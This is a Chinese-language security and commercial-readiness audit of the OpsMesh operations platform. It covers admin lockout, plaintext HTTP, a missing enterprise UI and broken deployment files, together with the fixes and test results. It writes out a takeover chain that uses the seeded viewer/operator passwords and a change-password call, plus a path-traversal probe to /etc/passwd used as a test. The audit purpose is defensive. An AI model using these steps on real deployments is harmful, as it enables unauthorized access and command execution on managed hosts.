# OpsMesh 商用化就绪度评估报告

> **评估日期**：2026-09-25
> **评估对象**：`F:\Nexus\OpsMesh`（v0.9.0，commit `2c87a0b`）
> **评估视角**：以「能否正式商用交付给企业客户」为准绳，而非「代码质量是否良好」
> **评估方法**：静态阅读 + **实际编译并运行二进制做黑盒验证**（前者读代码，后者跑产品）

> **⚠️ 2026-09-26 追加的关键事实（会改变"能不能卖"的判定，单独放在最前面）**：
> **P0/P1 的全部修复目前只存在于源码，不存在于任何可安装的发布物。**
> 对外最新的 `v0.9.1` 实测是空壳——GitHub Release `assets=0`，且 `ghcr.io/levango7/*` 里
> **没有 0.9.1 标签的镜像**（根因与三重证据见 §19；发布链路缺陷已修，门禁见 §20）。
> 因此"商用就绪"的必要条件尚未满足，且它**不是写代码能补的**：必须在门禁于 CI 真跑绿之后
> 切一个版本（§23 第 2 项），验收口径是"Release 产物非空 + 版本标签镜像可解析 + 签名与 SBOM 齐备"。
> 同期可安装的最新镜像仍是 `0.9.0`（2026-09-05），**不含**本轮全部安全修复。
> **与既有报告的关系**：`docs/evaluation-report.md`（2026-09-16）已覆盖代码质量维度且标记 35/35 已修复。本报告**不重复**该维度，聚焦其未覆盖的**商用阻断项**，并对其中的错误结论做了实证纠正。

---

## 0. 摘要

**一句话结论**：这是一个**工程量真实、设计有想法、但当前配置下无法交付给客户**的项目。

代码规模与测试投入可观（Go 24.3 万行，测试占 45%），核心机制（真实网段扫描纳管、DAG 编排、版本化迁移、gRPC 适配层）确实落地而非 PPT。但**按文档启动生产模式后，客户既登不进去、又不安全**——这不是代码质量问题，是「产品能不能交出去」的问题。

| 维度 | 评级 | 说明 |
|---|---|---|
| 代码规模与结构 | ★★★★☆ | 24.3 万行，35 个 internal 包，分层清晰 |
| 实现真实性 | ★★★★☆ | 核心功能真实现，非脚手架；网段扫描/SQL 持久化/迁移框架均落地 |
| 测试投入 | ★★★★☆ | 测试占 45%，实测通过；但以 mock 为主，未覆盖真实多副本/并发场景 |
| 安全基线（读代码） | ★★★☆☆ | TLS/JWT/密码策略/SSRF/注入防护齐全，设计意识强 |
| **安全基线（跑起来）** | ★★★☆☆ | 预置弱口令接管与管理员锁死**已修复**（P0-1）；Web 明文 HTTP 与 TLS 静默降级**已修复**（P0-2）；降级姿态显式化且生产默认 HTTPS |
| 多租户隔离 | ★★★★☆ | `users.tenant_id` + JWT 租户声明落库；跨租户下发路径已加统一校验；租户头伪造被拒 |
| 部署可用性 | ★★★★☆ | compose 路径真机跑通；企业版前端由镜像构建期装配进二进制、开箱可用 |
| 升级与灾备 | ★★★★☆ | 迁移加咨询锁 + checksum/版本门禁 + 可重放；18 个 `.down.sql` + 手工回滚手册 |
| 许可与商务机制 | ★★☆☆☆ | Apache-2.0 + 无第三方声明 + 无授权/版本机制（**未修，非技术阻断**） |
| **商用就绪度** | **★★★★☆** | 7 项 P0 + 六项技术类 P1（P1-1~P1-6）已修复并真机验证；剩余 P1-7（许可与商务合规，非技术阻断） |

**修复到「可商用」的总工作量估算：约 45–65 人天**（不含可选的企业级功能补齐）。其中 6 项 P0 阻断项约 25–40 人天，是唯一必须先做掉的部分。

> **进度（2026-09-25）**：**P0-1 ~ P0-7 七项阻断项已全部修复**，并以真机全栈复验收口（明细见 §2 各自
> 「修复交付物」与 §9 / §10）：
> - 第一批（P0-1/P0-2/P0-4/P0-7）：`deploy.sh up` 退出码 0，17 容器全 Up，端口真实可达，冒烟含
>   「采集目标全 UP」断言全绿；`verify-runtime.sh` **38 项全过**。
> - 第二批（P0-3/P0-5/P0-6，含 P1-8）：重建镜像（内置企业版前端）后重跑，**扩展至 58 项全过**
>   （新增企业版前端交付、压缩协商、迁移版本门禁、租户列落库、租户伪造拒绝等断言）；
>   真实 MySQL 8.0.46 上迁移集成测试 13/13 通过（含整链回滚）。静态门禁 20 项全过。
> - 过程中由「体积/头比对」断言抓出并修复 1 个自查漏网的缺陷：gzip 预压缩旁路把
>   `Content-Encoding` 头值（`gzip`）当文件后缀用，导致 gzip 客户端静默拿到未压缩原文
>   （服务端仍 200，只表现为体积翻 4 倍）。已修并补测试 + 运行时逐编码断言。
> - 第三批（P1-1 / P1-4 / P1-5）：`verify-runtime.sh` **69 项全过**；命令白名单按段校验、无界内存缓冲封顶、
>   指标基数熔断 + `/metrics` CIDR 准入 + 全局限流均经真机复验（含 403 fail-closed 与 429 突发的负向断言，见 §11）。
> - 第四批（P1-3）：`verify-runtime.sh` 扩容至 **86 项全过**（新增第 13 节 19 条审计链专项断言）；
>   在线库完成「改写一行 → 60s 内自检翻转并定位 `first_bad_id` → critical 告警 firing → 还原后自动清零」
>   全周期实证（见 §12.4）。
> - 第五批（P1-2）：`verify-runtime.sh` 扩容至 **94 项全过**（新增第 14 节 8 条 agent 签名/密钥专项断言）；
>   完成「全新纳管 → per-agent 密钥下发落盘 → v2 签名任务真实执行 → 错密钥被拒 → 杀进程重启沿用本机密钥」
>   端到端实证，并实测证明任务子进程读不到签名密钥（见 §13）。
>   **至此 §3 P1 表中技术类高风险项（P1-1/P1-2/P1-3/P1-4/P1-5）全部收口。**
>
> **尚未完成**：P1-7 许可与商务机制（非技术阻断）；P1-6 仅剩「微服务 ~250 处 `Printf` 的逐点严重级别升级」这一增量项（见 §17.5）；
> `services/` 双轨收敛（TD-60，路线图阶段四）。

---

## 1. 本次评估的实证方式

上一轮评估是纯静态的（6 维度子代理读代码）。**读代码看不出「跑起来会不会崩」。** 本次补充了黑盒验证：

```
go build -o /tmp/opsmesh-eval ./cmd/opsmesh   → RC=0（90MB）
启动 --production + TLS + JWT + 加密密钥        → 启动成功
HTTP  :18082/healthz                           → 200（明文！）      ← P0-2 复验后：400
HTTPS :18082/healthz                           → 连接失败（无 TLS 监听）← P0-2 复验后：200
curl -H 'X-Tenant-ID: attacker-tenant' /api/v1/devices → 401（租户头伪造被正确拒绝 ✓）
curl 登录 admin/admin123                        → 401 invalid username or password
curl 登录 operator/operator123                  → 200 ← 预置弱口令在生产仍可登录
curl 改密（用已知旧口令）                        → 200 + 返回完整 JWT ← 账号被完全接管
curl /enterprise/（界面上的按钮）                → 404
```

**下列所有 P0/P1 结论均为运行时或代码双重证据，标注了文件与行号。**

---

## 2. P0 阻断项（不修完不可交付）

### P0-1 生产模式下管理员被锁死，且预置弱口令账号可被公开接管 🔴 最严重

> **状态：已修复（2026-09-25）**，代码 + 运行时黑盒复验通过。修复实现见本节末尾「修复交付物」。

**这是本次评估发现的最严重问题，同时也是「产品不可用」和「产品不安全」的叠加。**

**现象 A：管理员无法登录。** 非 demo 模式下启动，`admin` 口令被替换为 32 位随机串，明文**不写日志、不落文件、无 flag 可设**。

```
证据：internal/controlplane/auth_password.go:44-79
      internal/controlplane/server.go:468-469（非 demo 触发轮换）
实测：--mode=controlplane（非 demo）启动日志：
      "[controlplane] 安全提示：默认 admin 密码已替换为随机口令"
      curl 登录 admin/admin123 → 401
      同一日志紧接着提示："请通过 --admin-password-file 或首登获取"
```

**而这两个 flag 根本不存在：**

```
证据：grep -rn 'admin-password-file|admin-password-stdout' 全仓库
      → 仅命中 auth_password.go:75,76,78 三行注释/日志文案本身
      → internal/config/config.go 的 119 个 flag 中无此项
```

即：**运维无法获得管理员口令，也没有任何重置命令、环境变量或文档化的恢复流程。客户拿到的是一台无人能登录的设备。**

**根因（文档与代码互相矛盾的第三处）：**

```
docs/operations.md:288
  | admin 密码 | 固定 admin/admin123 | 随机化（首次启动日志输出） |
                                                ^^^^^^^^^^^^^^^^^^ 已不成立
```

文档承诺「随机化后**首次启动日志输出**」，但该行为正是被 S7 安全修复刻意移除的（`auth_password.go:74-78` 注释明写「S7 修复：不在日志中打印明文密码」）。**安全修复移除了唯一的交付通道，却没有补上替代机制**——注释里写的 `--admin-password-stdout` / `--admin-password-file` 两个 flag 从未实现。这是一次**未完成的安全加固导致的可用性回归**，也解释了为何它能逃过既往 35 项静态自查：每一项单看都「已修复」，但组合起来把产品锁死了。

**现象 B：其他预置账号仍是公开弱口令，且可被完全接管。**

```
证据：internal/store/sql_rbac.go:408-430（种子用户 operator/operator123、viewer/viewer123）
      internal/store/sql_rbac.go:444-448（operatorGroups 含 task → operator 拥有 task:write）
实测（非 demo 模式，全新实例）：
  1. POST /auth/login {"username":"viewer","password":"viewer123"} → 200
     （返回 changePasswordToken，mustChangePassword=true）
  2. POST /auth/change-password
     {"oldPassword":"viewer123","newPassword":"Pwned!2345","changePasswordToken":"<上一步>"}
     → 200，返回完整 JWT（含 permissions 数组）
  → 攻击者仅凭公开仓库里的口令即取得有效会话
```

**为什么这是 P0 而不是中危**：`operator` 角色被授予 `task:write`（`sql_rbac.go:445,458`），而 `task:write` = 向纳管设备下发 shell 任务 = **被管机群上的任意命令执行**。这条链路对任何读过本仓库（Apache-2.0 公开仓库）的人是零门槛的：**读代码 → 拿到口令 → 登录 → 改密 → 获得机群 RCE**。

> 既有评估报告第 7 章将 `operator123` 判为「被强制改密机制中和」（安全子代理同结论），**该结论经实测不成立**：强制改密只阻止了直接调用 API，不阻止用已知旧口令完成改密并取得会话。

**修复方案（约 2–3 人天）**
1. 新增 `--admin-initial-password`（或 `--admin-password-file`），使运维可控；二者至少实现一个，并同时修正 `auth_password.go:75-78` 的误导文案。
2. 轮换范围从「仅 admin」扩展到**全部种子账号**；生产模式若检测到任何种子账号仍为初始口令，**拒绝启动**（fail-fast，与现有 TLS/JWT 校验风格一致）。
3. 提供文档化的口令恢复路径（如 `opsmesh admin reset-password --user admin`），写入 `docs/dr-runbook.md`。
4. 生产模式加一条启动自检：种子账号未改密则告警/拒绝启动。

---

#### 修复交付物（2026-09-25 实施）

**代码**

| 位置 | 改动 |
|---|---|
| `internal/controlplane/auth_password.go` | 删除 `rotateDefaultAdminPassword`（静默锁死），新增 `enforceInitialCredentials` / `deliverAdminCredential` / `revokeSeedCredentials`。admin 弱口令替换后必须经交付通道落地；operator/viewer 的公开弱口令一律替换为随机不可知口令 |
| `internal/controlplane/server.go:468-475` | 非 demo 启动时调用 `enforceInitialCredentials`，返回错误即中止启动（fail-fast） |
| `internal/config/config.go` | 新增 `--admin-password` / `--admin-password-file` / `--admin-password-force-reset`（含 `OPSMESH_ADMIN_PASSWORD` 等 env 映射）；`Validate()` 拒绝「只开恢复开关却不给口令」 |
| `services/auth-svc/cmd/auth-svc/main.go` | 同源缺陷同步修复：`AUTH_SVC_ADMIN_PASSWORD` / `AUTH_SVC_ADMIN_PASSWORD_FILE`，并明确告警「默认日志交付会进日志采集」 |
| `deploy/helm/opsmesh/` | Secret 新增 `admin-password`（显式 > 复用 > 首次随机，随机值前缀 `Aa1` 保证满足强口令校验）；Deployment 注入 `OPSMESH_ADMIN_PASSWORD`；`NOTES.txt` 给出读取命令 |
| `deploy/docker/docker-compose.prod.yml`、`deploy/docker/scripts/deploy.sh`、`deploy/systemd/opsmesh-controlplane.env` | 三条部署路径均接入口令交付通道 |

**行为矩阵（实测）**

| 场景 | 修复前 | 修复后 |
|---|---|---|
| 生产 + 无交付通道 | 启动成功但**无人能登录** | **拒绝启动**，报错指明 `OPSMESH_ADMIN_PASSWORD` / `--admin-password-file` |
| 生产 + `OPSMESH_ADMIN_PASSWORD` | 不适用 | admin 用该口令登录 200 → 首登强制改密 → 拿到正式 JWT |
| 生产 + `--admin-password-file` | 不适用 | 文件（0600）中的随机口令可登录 200 |
| 非生产非 demo | 同上锁死，且无提示 | 随机口令打印到 stderr，开发者不被锁死 |
| demo 模式 | `admin/admin123` 可登录 | 不变（保留一键演示，启动强告警） |
| `operator123` / `viewer123` | 200 登录 → 可完成改密 → 机群 RCE | **401**（启动即替换为随机不可知口令） |

**回归测试**：`internal/controlplane/auth_extra_test.go` 新增 9 个用例（生产无通道 fail-fast、显式口令生效、弱口令拒绝、口令文件 0600、目录缺失报错、幂等不回滚、强制恢复、无 admin 账号、种子账号清除）；`internal/config/security_defaults_test.go` 新增 3 个；`services/auth-svc/cmd/auth-svc/main_test.go` 新增 5 个。受影响包 `go test` 全绿。

**遗留（不在本次修复范围）**：`deploy/docker/index.html` 是遗留冒烟测试页（硬编码 `viewer/viewer123`、回显 token），未被任何 compose 引用，建议删除（见 §3）。

---

### P0-2 生产模式 Web/REST 接口是明文 HTTP，而部署文档宣称已启用 TLS 🔴

> **状态：已修复（2026-09-25）**，代码 + 运行时黑盒复验通过（16/16 断言）。修复实现见本节末尾「修复交付物」。

`--production` 会**强制要求** `--tls-cert`，否则拒绝启动（`config.go:997-1000`），给人一种「已满足等保三级传输加密」的错觉。实际上**该证书只用于 gRPC，浏览器访问的 HTTP 接口全程明文**。

```
证据：internal/controlplane/server_lifecycle.go:319  httpSrv.ListenAndServe()   ← 明文，无 TLS 分支
      internal/controlplane/server.go:50-51,301-302  tlsCert/tlsKey 仅被存储
      internal/controlplane/server_middleware.go:28  当 tlsCert != "" 时注入 HSTS ← 假定自己在跑 HTTPS
实测：--production --tls-cert=/tmp/c.pem ...
      http://127.0.0.1:18082/healthz  → 200
      https://127.0.0.1:18082/healthz → 连接失败（该端口不是 TLS 监听）
```

**并且文档给出了错误的操作指引**，会让运维配出一个连不通的代理：

```
docs/deployment-guide.md:728
  "跨网段建议走 HTTPS（控制面 --tls-cert / --tls-key 启用 HTTP TLS，
   Nginx proxy_pass https://controlplane:8080; + proxy_ssl_verify on;）"
```

而 `README.md` 的 flag 表中 `--tls-cert` 明确定义为「**gRPC** TLS 服务端证书路径」——文档内部自相矛盾，且部署手册那一侧是错的。

**商用影响**：登录口令、JWT、审计数据、任务输出全部明文过网。这直接违反等保三级「通信传输保密性」要求，而产品文档恰恰主打等保三级合规。企业客户的安全评审必然拦下。

**修复方案（约 1–3 人天，二选一）**
- **方案 A（推荐，成本低）**：把 HTTP TLS 做成受控特性或明确排除。修正 `deployment-guide.md:728`，改为明确要求 TLS 在 Nginx/Ingress 终止，并删除「--tls-cert 启用 HTTP TLS」的表述；同时移除 `server_middleware.go` 中基于 `tlsCert` 的 HSTS 注入（避免误导），改为由代理注入。
- **方案 B**：真的实现 HTTP TLS——`--tls-cert` 非空时走 `ListenAndServeTLS`（约 20 行），并让 `--production` 在 HTTP 面向公网时强制要求它。

---

#### 修复交付物（2026-09-25 实施）

采用**方案 B（真做 TLS）并兼容方案 A 的部署形态**：新增 `--http-tls=auto|on|off` 三态开关，把「控制面直供 TLS」与「上游 Ingress 终止 TLS」两种既存部署姿态都变成显式声明，而不是让代码静默选一种。

**代码**

| 位置 | 改动 |
|---|---|
| `internal/config/config.go` | 新增 `HTTPTLS` 字段（`--http-tls` / `OPSMESH_HTTP_TLS`）；`Validate()` 新增三项：非法取值拒绝、`on` 必须配齐 cert+key、**生产模式只有 `--tls-cert` 而无 `--tls-key` 直接拒绝启动**（原先此组合会静默退回 gRPC 明文，是同一处根因里更隐蔽的降级路径） |
| `internal/controlplane/server_netsec.go` | 新增 `buildHTTPTLS()`：`off`→返回 nil（明文）；`auto`→cert+key 齐备才 TLS；`on`→缺证书报错。TLS 配置**复用 `--tls-watch` 的热重载器**（证书轮换对 Web 与 gRPC 同时生效），回退路径走 `tlsutil.HTTPServerTLSConfig`，`MinVersion=TLS1.2` |
| `internal/controlplane/server_lifecycle.go` | Web/REST 监听由裸 `httpSrv.ListenAndServe()` 改为「先 `net.Listen` 再按 scheme 选择 `Serve` / `ServeTLS`」（`:319` 原缺陷点）；启动日志新增 `scheme`/`http_scheme` 字段，明文降级在生产模式打 WARN |
| `cmd/opsmesh/main.go` | `--health` 探针改为 **HTTPS 优先、失败回退 HTTP**（`InsecureSkipVerify`，等价 `curl -k`，仅用于本机存活探测）。否则 compose/k8s 的健康检查在启用 HTTPS 后会全线失败——这是开启 TLS 的连带损害面 |
| `services/auth-svc/` | 不涉及：auth-svc 无 B/S 监听器，本次修复为控制面单侧 |
| `deploy/helm/opsmesh/` | 新增 `controlplane.httpTLS`（默认 `off`，与「TLS 由 Ingress 终止」的既有形态一致并显式化）；`httpTLS=on` 时两个探针自动切 `scheme: HTTPS` |
| `deploy/systemd/opsmesh-controlplane.env` | 补 `OPSMESH_HTTP_TLS` 说明；修正 `OPSMESH_ADVERTISE_ADDR` 由 `http://0.0.0.0:8080`（既非法主机名、又不满足 `pkg/provision/auto.go:91` 生产要求 `https://` 的自动纳管前置条件）为 `https://opsmesh.example.com:8080` |
| `docs/deployment-guide.md` `docs/operations.md` `README.md` | 修正原「`--tls-cert` 启用 HTTP TLS」的错误表述（**这是 P0-2 的文档侧根因**）；补 `--http-tls` 三态语义表、启动失败诊断、生产检查清单 |

**行为矩阵（实测，16/16 断言）**

| 场景 | 修复前 | 修复后 |
|---|---|---|
| 生产 + cert/key + `auto`（默认） | 明文 HTTP，但注入 HSTS、下发 Secure Cookie（进程自认为已 HTTPS） | `https://` 返回 **200** 且证书为所配置者；同一端口发明文 HTTP 返回 **400**（Go 拒绝明文到 TLS 监听）；gRPC TLS 不受影响；`--health` 返回 0 |
| 生产 + cert/key + `off` | 同左（无差别） | 明文 200 + 启动 WARN（指明 Secure Cookie 与 MITM 风险）+ `--health` 回退成功；**姿态显式，不再是意外** |
| 生产 + `on` 但缺 cert/key | 启动成功，静默明文 | **拒绝启动**，报错指明 `--http-tls=on` 需 cert+key |
| 生产 + `--tls-cert` 无 `--tls-key` | 启动成功；gRPC **静默明文** | **拒绝启动**（`--tls-key` 缺失） |
| 非生产默认 | 明文 | 明文（行为不变，不破坏既有开发/演示流程） |
| 上游 Ingress/Nginx 终止 TLS | 文档错误指引 `proxy_pass https://controlplane:8080`（连不通） | 文档改为「控制面 `--http-tls=off` + 代理终止 TLS」，与实际代码一致 |
| 浏览器 `http://` 访问 TLS 端口 | 业务内容正常返回 | 400 拒绝（会话不再经明文外泄的第一道防线） |

**回归测试**：`internal/config/http_tls_test.go` 新增 7 个用例（默认值、flag/env/大小写归一、非法值、`on` 缺证书 ×3、生产 `off` 合法、空值等同 auto、生产 cert 无 key 拒绝）；`internal/controlplane/http_tls_test.go` 新增 7 个（自签 ECDSA P-256 证书夹具 + `httptest` 真 TLS 握手：auto/off/on/非法/空值、复用 `--tls-watch` 热重载器、**真实证书链校验下的 200 与明文非 200**）；`cmd/opsmesh/main_test.go` 新增 2 个（HTTPS 探针成功/非 200）。因新增「生产 cert 无 key 拒绝」规则，同步修正 5 处既有测试夹具补 `TLSKey`。相关包 `go test` 全绿（EXIT=0），`helm template` 三种配置渲染通过。

**说明（为什么不是「二选一」）**：本次评估原建议二选一，但实测发现产品**同时**存在两种真实部署形态——`deploy/docker/*` 让控制面直供端口，`deploy/helm/*` 用 Ingress 终止 TLS。任何单侧硬编码都会打破另一种形态；三态开关使两种姿态都显式、可审计，且生产默认（有证书即 HTTPS）满足等保三级传输加密。

**遗留**：`deploy/docker/docker-compose.prod.yml` 缺证书则无法启动的问题属 P0-4（该文件另有独立缺陷），未在本次范围内。

---

### P0-3 企业版前端（战略 UI）没有任何可交付路径，且随包界面上的入口是 404 🔴

> **状态：已修复（2026-09-25）**，`go:embed` 接线 + 路由 + 镜像构建 + CI 黑盒验收全部落地。
> 修复实现见本节末尾「修复交付物」，镜像内实测证据见 **§10.2**（含 br/gzip 压缩协商与 SPA 回退逐字节一致性）。

产品实际上有**两套前端**：

| 版本 | 位置 | 技术栈 | 是否随二进制交付 |
|---|---|---|---|
| 个人版 | `internal/controlplane/embed/web/` | 原生 ES Module，88 个 .js | ✅ 已 go:embed 进二进制 |
| 企业版 | `web/enterprise/` | Vue3 + Vite，223 个 .js/.vue | ❌ **未嵌入、无路由、未进任何部署资产** |

```
证据：internal/controlplane/server_lifecycle.go:23-24  仅注册 "/" 与 "/assets/"
      grep -rn 'enterprise' --include=*.go internal/ cmd/  → 仅命中注释，无路由注册
      grep -rln 'enterprise' deploy/ docker-compose*.yaml Dockerfile*  → 无任何命中
      web/enterprise/dist/  存在，但 git ls-files 计数 = 0（未入库，本地构建产物）
      web/enterprise/node_modules  不存在
实测：curl http://127.0.0.1:18080/enterprise/      → 404
      curl http://127.0.0.1:18080/enterprise/index.html → 404
```

而个人版首页里有一个醒目的 CTA 指向它：

```html
<!-- internal/controlplane/embed/web/index.html -->
<a class="btn-enterprise" href="/enterprise/">进入企业版前端 →</a>
```

**影响**：按 README「快速启动（零依赖，30 秒）」走的第一个用户，点开浏览器看到的第一个主按钮就是 404。而 `DELIVERY.md` §4.5 用整章篇幅把企业版前端描述为交付主体（13 个子域、1121 个 vitest 用例）。Helm/Compose/K8s 三种部署形态**都不包含它**。客户需要一个「企业版」产品时，拿到的只有一个 gitignored 的 dist 目录和一句「请自行 npm install && npm run build」。

**修复方案（约 3–5 人天）**
1. CI 增加企业版构建 job，产物以 `go:embed` 注入（或独立 nginx 镜像）。
2. Go 侧注册 `/enterprise/` 静态路由并正确设置 `base: '/enterprise/'` 的资源前缀（Vite 已配 `base`，但无服务端）。
3. Helm/Compose 增加前端交付路径（内嵌或 sidecar nginx），并在 `deploy/k8s/` 补齐。
4. 在个人版入口按钮上做兜底：企业版不可用时不展示该链接。

**修复交付物（2026-09-25 实施，方案 1+2+4；弃用方案 3 的 sidecar 路线）**

选择「内嵌进控制面二进制」而非「sidecar nginx」：企业版前端是控制面的 UI，分两个容器会引入
额外的端口/证书/健康检查契约，而 `go:embed` 已经把个人版前端打进去了——同一机制零新增运维面。

1. **`go:embed` 接线**：`internal/controlplane/embed/embed.go` 新增 `EnterpriseFS`（嵌入
   `internal/controlplane/embed/enterprise`）。go:embed 不能跨目录，故产物必须落到该目录，
   由 `deploy/docker/scripts/build-enterprise-web.sh`（`npm ci && npm run build` → 拷贝 dist/）完成组装；
   `make frontend` 已改为调用该脚本（此前只跑 `npm run build`，产物永远进不了二进制——这正是缺陷根因）。
2. **静态路由**：新增 `internal/controlplane/enterprise_ui.go`：
   - `GET /enterprise/` → 外壳；`/enterprise/devices` 等前端路由按 vue-router history 模式
     回退 `index.html`；缺失的前端分包显式 404（不伪装成 HTML，避免 MIME 报错难排查）；
   - `GET /enterprise/assets/*` → 带内容哈希的资源长缓存 `immutable`，`index.html`/`sw.js` 等入口
     `no-cache`；支持 `.br`/`.gz` 预压缩旁路协商（Vary: Accept-Encoding）；
   - 路径穿越（`/enterprise/assets/../..`）一律 404，只读 embed.FS、不回落宿主文件系统；
   - `/enterprise`（无尾斜杠）301 到 `/enterprise/`（否则 Vite 相对资源路径会挂到站点根）。
   - **有意不做租户头校验**：浏览器不会带 `X-Tenant-ID`，且空白外壳必须先渲染出登录页；
     隔离由 `/api/v1/*` 的鉴权承担（外壳内无任何数据）。
3. **未内置时的诚实降级**（方案 4）：产物目录入库一个 `placeholder.html`（含标记），
   `bundleAvailable()` 以「`index.html` 是否存在且不含标记」判定；未内置时
   `/enterprise/` 返回说明页（200 + `X-OpsMesh-Enterprise-Bundle: placeholder`，不是 404），
   且个人版首页的「进入企业版前端 →」入口被服务端自动摘除（HTML 内以
   `<!--OPSMESH_ENTERPRISE_CTA_START/END-->` 包裹，`stripEnterpriseCTA` 处理）。
   这样「源码构建（无 Node）」与「发布镜像」两条路径都不会把用户送到 404。
4. **镜像交付**：`Dockerfile`（CI 发布镜像 / Makefile docker）与 `deploy/docker/Dockerfile.controlplane`
   （`deploy.sh up` / compose）都新增 `node:22-alpine` 构建阶段，产物 `COPY --from=web` 覆盖 embed 目录，
   构建失败即镜像构建失败（不静默降级为占位页）。受限网络可 `--build-arg NPM_REGISTRY=<镜像源>`。
   同步修正 `.dockerignore`：此前整体排除 `web/`，镜像构建根本拿不到前端源码（缺陷的另一半成因）。
5. **CI 防回归**（`frontend` job 扩展）：vitest 通过后组装产物 → 跑 `TestEnterprise*`（真实产物态）
   → 构建二进制并**黑盒启动**，断言 `/enterprise/` 200、外壳引用产物、静态资源 200、
   SPA 回退 200、个人版首页保留入口、且**不得**出现占位页特征。
   占位态的用例由 `build-test` job 的常规 `go test` 覆盖（两态都测）。

**实测收口（2026-09-25，本机二进制 + 真实产物）**：
`GET /enterprise/` 200（`Content-Type: text/html`，`Cache-Control: no-store`，CSP 正常）；
外壳引用 `/enterprise/assets/js/index-DZhQRfLW.js`；该资源 200（37.4KB，
`Accept-Encoding: br` 时 `Content-Encoding: br` + `Vary: Accept-Encoding`，`immutable` 长缓存）；
`GET /enterprise/devices` 200 且与外壳逐字节一致；`GET /enterprise/assets/js/nope.js` 404；
`/enterprise/assets/../../../etc/passwd` 404；个人版 `GET /` 保留 `href="/enterprise/"` 入口且无标记残留。
占位态（临时移除 `index.html`）下 `TestEnterprise*` 同样全绿、入口被摘除、说明页 `未内置`。

---

### P0-4 主要部署资产开箱即坏（客户第一小时就跑不起来）

```
证据：deploy/docker/docker-compose.prod.yml
  - 默认 OPSMESH_PRODUCTION=true，但未传 TLS 证书与 OPSMESH_ENCRYPTION_KEY
    → config.Validate() 拒绝 → cmd/opsmesh/main.go:63 退出码 1 → 容器 CrashLoopBackOff
  - MySQL 启动参数含 MySQL 8.0 已移除的 --query-cache-type=1 → mysqld 自身启动失败
证据：deploy/k8s/ 为半成品：仅 5 个微服务 deployment，无 controlplane / MySQL / Redis
      configmap 设置 OPSMESH_LOG_LEVEL/FORMAT，但无任何 Go 代码读取这两个键
证据：deploy/gitops/ 生产段镜像 tag 钉在 0.7.0，chart 为 0.9.0（版本漂移）
```

**影响**：`docker compose up` 起不来；k8s 路径不可用；GitOps 路径会部署旧版本。Helm Chart 本身质量较好（19 模板、Secret lookup 持久化、备份 CronJob 齐备），但需要手工 override 才能生产用。

**修复方案（约 5–8 人天）**：修 compose.prod 的环境变量与 MySQL 参数；补齐或明确废弃 `deploy/k8s/`；GitOps tag 对齐；CI 增加「部署资产可渲染 + 变量与 config.go 对齐」校验。

#### 修复交付物（2026-09-25 实施，以「真机把生产栈跑起来」为验收）

验收方式不是静态检查，而是反复执行 `deploy/docker/scripts/deploy.sh up` 直到全栈真实起来。
下面 7 个阻断项**全部通过了静态检查**，只在真机启动时才暴露——这也是上一轮「35/35 已修复」
与「compose 起不来」能同时成立的原因：

| # | 症状（真机实测） | 根因 | 修复 |
|---|---|---|---|
| 1 | 微服务镜像构建失败 | 构建上下文必须是仓库根：`services/*/go.mod` 含 `replace opsmesh => ../..`，单服务目录做上下文时容器内无主模块 | compose 统一「根上下文 + `Dockerfile.service` + `--build-arg SERVICE/VERSION`」，与 `release.yml` / `deploy-opsmesh.sh` 同契约 |
| 2 | Loki CrashLoop | 配置按 Loki 2.x 写（`chunk_store_config.max_look_back_period`、`compactor.shared_store`），镜像钉的是 `grafana/loki:3.2.0` | 改为 `limits_config.max_query_lookback` + `compactor.delete_request_store` |
| 3 | otel 配置加载失败 | health_check 扩展用了 0.110.0 已移除的 `exporter_names` 键 | 改为 `exporter_failure_threshold: 5` |
| 4 | otel CrashLoop：`bind: address already in use (8888)` | 0.110.0 内部遥测默认仍监听 `:8888`，与应用侧 prometheus exporter 撞端口 | `service.telemetry.metrics.address: 0.0.0.0:8889`，新增 `otel-collector-internal` 采集 job |
| 5 | otel 恒 `unhealthy`（但进程正常） | distroless 镜像无 shell / 无 wget，`CMD wget` 健康检查无法执行（`executable file not found in $PATH`） | 移除容器内 healthcheck；把 health_check 扩展端口发布到 `127.0.0.1:13134`，由 deploy.sh 从宿主探活 |
| 6 | auth-svc 初始口令引导失败：`must contain at least one special character` | 生成器只满足控制面策略，而 auth-svc 策略更严（≥12 位 + 大小写 + 数字 + 特殊字符） | 统一按「两套策略的并集」生成与预检，不合规 .env 在预检阶段即被拦下 |
| 7 | **13 个容器声明了宿主端口却全部不可达** | `backend_net`/`monitoring_net` 标了 `internal: true`，其上的容器又声明了宿主端口。Docker Desktop(WSL2) 对「所连网络全为 internal」的容器会**静默丢弃** publish：容器 Up/healthy，但 `NetworkSettings.Ports` 为空、`docker port` 无输出、`compose up` 不报任何错 | 去掉两处 `internal: true`；入站边界继续由「端口只发布到 `127.0.0.1`」保证 |

第 7 项的判定依据是下面的对照实验（同一镜像、同一宿主端口、仅网络不同）：

```
--network opsmesh-backend(internal)   → Ports={"9090/tcp":[]}                                curl → 000
--network opsmesh-frontend            → Ports={"9090/tcp":[{"HostIp":"127.0.0.1","HostPort":"28102"}]} curl → 200
--network opsmesh-backend + frontend  → Ports={"9090/tcp":[{"HostIp":"127.0.0.1","HostPort":"28103"}]} curl → 200
```

附带发现（同一根因，属功能不可用而非仅是端口问题）：internal 网络没有网关，**出站 DNS 也不通**。
实测 `opsmesh-alert-svc` 容器内 `getent hosts events.pagerduty.com` 直接解析失败，而 compose 为它
配了 `PAGERDUTY_API_URL=https://events.pagerduty.com/v2/enqueue`——即 PagerDuty 集成在
`internal: true` 下**永远不可能工作**。若确需限制微服务出站，应改用宿主防火墙或 K8s NetworkPolicy。

**防回归**：`deploy/scripts/validate-deploy-assets.sh` 新增硬门禁——凡声明了 `ports` 的服务，
其网络不能全为 `internal: true`（注入 `internal: true` 后门禁实测报出 8 个服务，见 §9）。
该脚本已接入 CI `security` job（`.github/workflows/ci.yml`）。

#### 附带修复：监控栈开箱即产生 5 条 critical 假告警

栈跑起来后查 Prometheus 的 `/api/v1/alerts`，一个**完全健康**的部署上常驻 5 条 critical：

```
firing MySQLDown        job=opsmesh-mysql  severity=critical
firing RedisDown        job=opsmesh-redis  severity=critical
firing ServiceDown      job=opsmesh-redis  severity=critical
firing ServiceDown      job=opsmesh-mysql  severity=critical
firing ServiceDown      job=docker         severity=critical
```

根因两处：
1. `prometheus.yml` 的 `opsmesh-mysql` / `opsmesh-redis` 用了 blackbox_exporter 的协议
   （`metrics_path: /probe` + `params.module: tcp_connect`），但**栈内没有 blackbox-exporter**，
   且 job 缺 `relabel_configs`——等价于让 Prometheus 直接向 MySQL/Redis 发 HTTP `/probe` 请求，
   target 恒 DOWN。
